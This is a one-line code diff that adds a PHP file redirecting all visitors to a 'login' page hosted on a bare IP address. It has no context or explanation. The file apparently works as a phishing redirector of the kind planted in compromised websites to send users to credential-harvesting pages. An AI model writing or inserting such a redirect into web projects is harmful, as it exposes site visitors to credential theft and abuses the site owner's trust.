@@ -1,0 +1,1 @@
+<?php header('Location: http://179.29.105.191/1709/login'); ?>
